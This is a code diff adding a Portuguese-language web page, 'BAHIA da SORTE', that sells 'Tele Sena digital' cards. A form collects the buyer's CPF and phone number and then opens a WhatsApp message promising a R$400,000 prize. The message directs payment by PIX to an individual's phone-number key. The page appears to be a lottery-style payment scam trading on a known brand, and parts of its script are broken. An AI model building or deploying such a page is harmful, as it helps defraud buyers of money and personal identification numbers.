@@ -1,0 +1,602 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//pt-BR">
+<head>
+    <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/SuaSortehoje/bahiadasorte/main/teleSena1.jpg">
+    <link rel="icon" href="https://raw.githubusercontent.com/SuaSortehoje/bahiadasorte/main/teleSena.jpg" type="image/jpg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <link rel="stylesheet" type="text/css" href="stylesheet.css" media="screen" />
+    <title>BAHIA da SORTE</title>
+    <style>
+        /* Adicione seu CSS aqui */
+        [type=submit] {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            margin: 20px;
+            height: 30px;
+        }
+        h2 {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            font-size: 18px;
+            color: black;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 60px;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.0);
+        }
+        .modal-content {
+            background-color: #00DF00;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            border-radius: 10px;
+        }
+        .close {
+            color: red;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        body {
+            background: #00d0ff;
+            color: black;
+        }
+        #rodado {
+            width: 100%;
+            max-height: 80%;
+            border-radius: 10px;
+            text-decoration:none;
+        }
+        #rodado:focus {
+            transform: all 1.1.5s;
+        }
+        h3 {
+            display:flex;
+            margin:0;
+           justify-content:center;
+            color: black;
+            
+        }
+        #openModal {
+            display: inline;
+            width: 45%;
+            height: 40px;
+            margin-left: 0px;
+            background: green;
+            color: white;
+            border-radius: 10px;
+            outline: none;  
+            z-index:3;
+        }
+        #openSite{
+            display: inline;
+            width: 40%;
+            height: 40px;
+            margin-left: 5px;
+            background: gold;
+            border-radius: 10px;
+            outline: none;  
+        }
+        .openModal1 {
+            display: inline;
+            width: 30%;
+            height: 40px;
+            margin-left: 7px;
+            background: blue;
+            color :white;
+            border-radius: 10px;
+            outline: none;
+            z-index:1;
+        }
+           #openModal1 {
+            display: inline;
+            width: 50%;
+            height: 40px;
+            margin-left: 7px;
+            background: blue;
+            color :white;
+            border-radius: 10px;
+            outline: none;
+            z-index:1;
+        }
+        #btn:focus {
+            background: red;
+            color: gold;
+            border-radius: 16px;
+            border-decoration: none;
+            outline: none;
+            border: 1px solid blue;
+        }
+        .ganhador1 {
+            width: 17%;
+            height: 100px;
+            margin-left: 1px;
+            border: 1px solid red;
+            border-radius: 16px;
+        }
+        .pxm {
+            color: red;
+            background: black;
+        }
+        .giro {
+            width: 40%;
+            height: 50px;
+            display: inline;
+            margin-left: 5%;
+            text-align: center;
+            font-size: 12px;
+            font-weight: bold;
+            border: 10px;
+            background: orange;
+            border-radius: 16px;
+            border: 1px solid black;
+            outline: none;
+            color: black;
+        }
+        a {
+            color: orange;
+        }
+        .premio {
+            display: flex;
+            flex-direction;
+            justify-content: center;
+        }
+        button[type="submit"] {
+        width:40%;
+            margin-left: 80px;
+            border-radius: 10px;
+            outline: none;   
+        }
+        button[type="submit"]:hover {
+            background: green;
+            color: white;
+        }
+        button:active {
+    transform: scale(0.98);
+}
+        [name=numeroDezenas] {
+            width: 20px;
+            border-radius: 5px;
+            color: black;
+            text-align: center;
+            font-weight: bold;
+            outline: none;
+        }
+        [name=numeroDezenas]:focus {
+            background: pink;
+            color: black;
+        }
+        #cpf {
+            text-align: center;
+            width: 55%;
+            border-radius: 10px;
+            outline: none;
+            font-weight: bold;
+            margin-left: 50px;
+        }
+        #cpf:focus {
+            background: pink;
+            color: black;
+        }
+        .imagem {
+            border-radius: 50px;
+            width:100%;
+            max-height:80%;
+            
+        }
+        #telefone {
+            text-align: center;
+            width: 40%;
+            border-radius: 10px;
+            outline: none;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        #telefone:focus {
+            background: pink;
+            color: black;
+        }
+        
+#parcelas, #legenda {
+    float: left;
+    clear: both;
+    
+}
+#parcelas div {
+    float: left;
+     margin-top:0;
+    padding: px 0px;
+    width: 40px;
+    background:blue;
+    color:white;
+    margin-left:10px;
+    text-align: center;
+}
+#legenda div {
+    float: left;
+    margin-left:10px;
+    width: 40px;
+    margin-top:0;
+    text-align: center;
+    
+}
+.casca {
+    background:blue;
+}
+#valorTotal{
+    font-weight:bold;
+    margin-left:60px;
+    font-size:20px
+    
+}
+    .imgCompra{
+        width:15%;
+        height:45px;
+        margin:2px;
+    
+}
+    .imgCompra.adicionara{
+    transform:scale(2.5);
+}
+    #txta{
+    color:blue;
+}
+    .central{
+    display:flex;
+    justify-content:center;
+    
+}
+.marquee { display:linear;width:150%; overflow: hidden; white-space: nowrap; box-sizing: border-box; animation: marquee 25s linear infinite; } 
+@keyframes marquee { 
+0% { transform: translateX(0%); } 
+50% { transform: translateX(-40%); }
+ 100% { transform: translateX(-0%); 
+} 
+}
+
+html, body {
+  overflow: hidden;
+}
+.tafixoaqui{
+    position:absolute;
+   
+}
+.alinha{
+    
+    
+}
+.item { display: inline-block; width: 15%; /* Ajuste para evitar quebra de linha */ margin: 0 0.3%; padding: 0px; background-color: lightgreen; text-align: center; font-size:14px;}
+
+.labelCompra{
+    text-align:center;
+    font-weight:bold;
+    
+    margin-left:30px;
+}
+ .blink { animation-duration: 3s; animation-name: slidein; } @keyframes slidein { from { margin-left: 100%; width: 300%; } to { margin-left: 0%; width: 100%; } }}
+ 
+ .sobrepor{
+ position:fixed;
+     
+ }
+ .stiloModal{
+     display:flex;
+     position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5); /* Fundo transparente */
+  justify-content: center;
+  align-items: center;
+ }
+.contentModal{
+     background-color: lightblue;
+  padding: 20px;
+  border-radius: 8px;
+  width: 300px;
+  text-align: center;
+ }
+ .fechaModal{
+ top:0px;
+     float: right;
+  font-size: 24px;
+  cursor: pointer;
+ }
+ p{
+     font-weight:bold;
+ }
+ span{
+     color:red;
+ }
+ .ganhar{
+     color:green;
+     background:white;
+     font-weight:bold;
+     border-radius:10px;
+     margin:2px;
+ }
+    </style>
+</head>
+<body>
+   
+<div id="siloModal" class="stiloModal">
+    <div id="" class="contentModal">
+        <span class="fechaModal">&times;</span>
+        <h2>PROMOCAO</h2>
+        
+        <p>NA COMPRAR DE ( 07 ) TELE SORTE DA MESMA EDIÇÃO <span class="ganhar">GANHAR + 1 GRATIS<span></span></p><p>ACUMULADO NO MES 12 TELE SENA <span class="ganhar"> GANHAR + 1</span></p>
+        <button class="blink" id="openModal"><b>COMPRA SUA TELE SENA DIGITAL</b></button>
+    </div>
+</div>
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>COMPRAR SEU TELE SENA</h2>
+            <form id="pixForm">
+                <label for="cpf"><b>CPF :</b></label>
+                <input maxlength="14" type="tel" id="cpf" name="cpf"><br><br>                                    
+                <label for="telefone"><b>TELEFONE :</b></label>
+                <input maxlength="15" type="tel" id="telefone" name="telefone" required><br><br>
+                  <label for="numeroDezenas"><b>Nº CARTELAS:</b></label>
+<input type="checkbox" id="numeroDezenas1" name="numeroDezenas" value="" onchange="atualizarValorTotal()">
+<input type="checkbox" id="numeroDezenas2" name="numeroDezenas" value="" onchange="atualizarValorTotal()">
+<input type="checkbox" id="numeroDezenas3" name="numeroDezenas" value="" onchange="atualizarValorTotal()">
+<input type="checkbox" id="numeroDezenas4" name="numeroDezenas" value="" onchange="atualizarValorTotal()">
+<input type="checkbox" id="numeroDezenas5" name="numeroDezenas" value="" onchange="atualizarValorTotal()">
+<br>
+                <p id="valorTotal"> Total a Pagar: R$ 0,00</p>
+                <button type="submit">Validar</button>
+            </form>
+        </div>
+    </div>
+
+    <h3>TELE SENA</h3>
+    
+
+    <div id="parcelas">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+</div>
+<div id="legenda">
+    <div>dias</div>
+    <div>hrs</div>
+    <div>min</div>
+    <div>seg</div>
+</div>
+    </div>
+    <a href="https://api.whatsapp.com/send?phone=5571992290058&text=QUERO%20COMPRA%20O%20TELE%20SENA%20">
+        <img alt="SEM EDICAO" src="https://raw.githubusercontent.com/SuaSortehoje/bahiadasorte/main/teleSena1.jpg" onclick="compra()" id="rodado"class="imagem">
+    </a><br>
+<div class="marquee" >
+    <div class="alinha">
+        <div class="item">IPTV</div>
+        <div class="item">INTERNET</div>
+   <div class="item">Banda LadoT</div>
+   <div class="item">PagSeguro </div>
+   <div class="item">RecargaPay</div>
+   <div class="item">Reformar</div>
+   </div>
+  <a href="https://wa.me/5571992290058"><img onclick="alert('IPTV O MELHOR DA TV POR ASSINATURA')"src="iptv.jpg"class="imgCompra"/></a>
+   <a href="https://wa.me/5571992290058"><img onclick="alert('INTERNET ILIMITADA PARA VIVO E TIM ')"src="internet.jpg"class="imgCompra"/></a>
+    <a href="https://wa.me/5571993010261"><img onclick="alert('Ligue e Contrate para todos os evertos')"src="ladoT.jpg"class="imgCompra"/></a>
+    <a href="pagbank.vc/indica-maquininhas-b44df1c97">
+    <img onclick="alert('pagseguro comprar de maquininha com a menor taxa do mercado')" src="PagSeguro1.jpg"class="imgCompra"/></a>
+  
+ <a href="https://recargapay.com.br/r/suemac549-ZEG"><img onclick="alert('RecargaPay abrar sua conta e um Mundo de vantagem!')"src="recargaPay.jpg"class="imgCompra"/></a>
+ 
+   
+ <a href="https://wa.me/5571999259612"><img onclick="alert(Reformar de casa em geral gesso pintura elétrica construção!')"src="reforma.jpeg"class="imgCompra"/></a>
+ 
+ 
+</div>
+<div class="sobrepor">
+<label class="labelCompra">COMPRE SUA TELE SENA AQUI</label>
+    
+    
+        <button class="blink" id="openModal1"><b>COMPRA SUA TELE SENA DIGITAL</b></button>
+
+    <a style="color:blue;display:none" href="resultadoBahiaDaSorte.html"></a>
+    <a id="txta">
+          
+        <button class="openModal1"><b>CONSULTAR RESULTADO</b></button></a>
+</div>
+    <script>
+ const elementos = document.querySelectorAll('.imgCompra'); // Adiciona o evento de clique a cada elemento elementos.forEach((elemento) => { elemento.addEventListener('click', () => { // Adiciona a classe 'adicionara' ao elemento clicado elemento.classList.add('adicionara'); }); });
+        
+        
+        function validarDezena(input) {
+            if (input.value > 60) {
+                alert('O número deve ser no máximo 60');
+                input.value = '';
+            }
+            atualizarValorTotal();
+        }
+
+        function atualizarValorTotal() {
+    // Seleciona todos os checkboxes
+    const checkboxes = document.querySelectorAll('input[name="numeroDezenas"]:checked');
+
+    // Calcula o total com base na quantidade marcada
+    const totalDezenas = checkboxes.length * 15;
+
+    // Atualiza o texto do valor total
+    document.getElementById('valorTotal').textContent = `Valor Total: R$ ${totalDezenas},00`;
+}
+
+
+        // // Seleciona os botões que abrirão o modal
+const botaoAbrir1 = document.getElementById('openModal');
+const botaoAbrir2 = document.getElementById('openModal1');
+
+// Seleciona o modal
+const modal = document.getElementById('myModal');
+
+// Seleciona o botão de fechar do modal
+const botaoFechar = document.getElementsByClassName('close')[0];
+
+// Função para abrir o modal
+function abrirModal() {
+    modal.style.display = 'block';
+}
+
+// Função para fechar o modal
+function fecharModal() {
+    modal.style.display = 'none';
+}
+
+// Adiciona os eventos de clique aos botões
+botaoAbrir1.addEventListener('click', abrirModal);
+botaoAbrir2.addEventListener('click', abrirModal);
+
+// Adiciona o evento de clique no botão de fechar
+botaoFechar.addEventListener('click', fecharModal);
+
+// Fecha o modal se o usuário clicar fora dele
+window.addEventListener('click', (event) => {
+    if (event.target === modal) {
+        fecharModal();
+    }
+});
+
+        document.getElementById('pixForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const cpf = document.getElementById('cpf').value;
+    const telefone = document.getElementById('telefone').value;
+
+    // Coleta os valores dos checkboxes marcados
+    const numeroDezenas = Array.from(document.querySelectorAll('input[name="numeroDezenas"]:checked'))
+        .map(checkbox => checkbox.value)
+        .join(', ');
+
+    const totalDezenas = numeroDezenas.split(', ').length * 15;
+
+    const titulo = 'VALIDAR MINHA TELE SENA';
+    const premio = "*400.000.00*\n TOTAL LIQUIDO R$ 400.000.00";
+    const chavepix = 'telefone: 71992290058\n\CARLOS DOS SANTOS REIS \nCELCOIN';
+    const alerta = "Apos o fazer o ( PIX ) Aguarde ate 1 minutos para receber sua cartela validada";
+    const valor = `R$ ${totalDezenas},00`;
+
+    const saudacao = "BOA SORTE!!!";
+
+    const numeroWhatsApp = 71992290058;
+
+    const lista = "-------------------------------------------";
+
+    var mensagem = `  *🐷${titulo}🐷*\n                    \n${premio}\n\nCPF : ${cpf}\n\nTelefone : ${telefone}\n\nVALOR A PAGAR : ${valor}\n\n*${lista}*\n\n*CHAVE PIX*\n${chavepix}\n\n*${alerta}*\n\n                *🐷${saudacao}🐷*`;
+
+    var mensagemEncoded = encodeURIComponent(mensagem);
+    var linkWhatsApp = `https://api.whatsapp.com/send?phone=${numeroWhatsApp}&text=${mensagemEncoded}`;
+    window.open(linkWhatsApp, '_blank');
+
+    document.getElementById('myModal').style.display = 'none'; // Fecha o modal após enviar
+});
+
+        
+    const dataFinal = new Date('2024/12/08').getTime();
+const divs = document.querySelectorAll('#parcelas div');
+
+function atualizarContador() {
+    const agora = new Date().getTime();
+    const falta = dataFinal - agora;
+
+    if (falta < 0) {
+        divs.forEach((div) => {
+            div.innerHTML = '0';
+        });
+        return;
+    }
+
+    const segundos = Math.floor((falta / 1000) % 60);
+    const minutos = Math.floor((falta / (1000 * 60)) % 60);
+    const horas = Math.floor((falta / (1000 * 60 * 60)) % 24);
+    const dias = Math.floor(falta / (1000 * 60 * 60 * 24));
+
+    const valores = [dias, horas, minutos, segundos];
+    valores.forEach((valor, i) => {
+        divs[i].innerHTML = valor;
+    });
+}
+
+setInterval(atualizarContador, 1000);
+atualizarContador();
+
+   
+// Fechar o modal de promoção ao clicar no "X"
+let stiloModal = document.querySelector('.stiloModal');
+let fechaModal = document.querySelector('.fechaModal');
+
+// Fecha o modal ao clicar no "X"
+fechaModal.addEventListener('click', () => {
+    stiloModal.style.display = 'none';
+});
+
+// Fecha o modal ao clicar fora dele
+window.addEventListener('click', (event) => {
+    if (event.target === stiloModal) {
+        stiloModal.style.display = 'none';
+    }
+});
+
+// Validação do CPF
+function validarCPF(cpf) {
+    cpf = cpf.replace(/\D/g, ''); // Remove caracteres não numéricos
+    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+
+    let soma = 0;
+    for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
+    let resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+    if (resto !== parseInt(cpf.charAt(9))) return false;
+
+    soma = 0;
+    for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
+    resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+    return resto === parseInt(cpf.charAt(10));
+}
+
+// Máscara para o campo de telefone
+const telefoneInput = document.getElementById('telefone');
+telefoneInput.addEventListener('input', () => {
+    let telefone = telefoneInput.value.replace(/\D/g, '');
+    telefone = telefone.replace(/^(\d{2})(\d)/g, '($1) $2');
+    telefone = telefone.replace(/(\d{5})(\d)/, '$1-$2');
+    telefoneInput.value = telefone;
+});
+
+// Validação do formulário
+const formulario = document.getElementById('formulario');
+const cpfInput = document.getElementById('cpf');
+
+formulario.addEventListener('submit', (event) => {
+    const cpf = cpfInput.value;
+    if (!validarCPF(cpf)) {
+        alert('CPF inválido. Por favor, insira um CPF válido.');
+        event.preventDefault();
+    }
+});
+
+    </script>
+</body>
+</html>
+ 
